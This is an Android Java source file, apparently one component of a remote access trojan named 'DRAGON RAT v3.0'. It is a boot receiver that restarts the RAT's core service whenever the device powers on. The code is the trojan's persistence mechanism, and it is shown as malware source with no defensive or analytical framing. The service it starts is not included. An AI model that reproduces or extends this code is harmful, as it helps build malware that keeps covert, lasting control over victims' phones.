package com.dragon.rat;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.util.Log;

/**
 * DRAGON RAT v3.0 — Boot Receiver
 * Starts CoreService when device boots up
 * Handles BOOT_COMPLETED, QUICKBOOT_POWERON
 */
public class BootReceiver extends BroadcastReceiver {
    
    private static final String TAG = "DRAGON-BOOT";
    
    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        if (action == null) return;
        
        Log.d(TAG, "Received: " + action);
        
        if (action.equals(Intent.ACTION_BOOT_COMPLETED) || 
            action.equals("android.intent.action.QUICKBOOT_POWERON")) {
            
            Intent serviceIntent = new Intent(context, CoreService.class);
            
            if (Build.VERSION.SDK_INT >= 26) {
                context.startForegroundService(serviceIntent);
            } else {
                context.startService(serviceIntent);
            }
            
            Log.d(TAG, "CoreService started on boot");
        }
    }
}
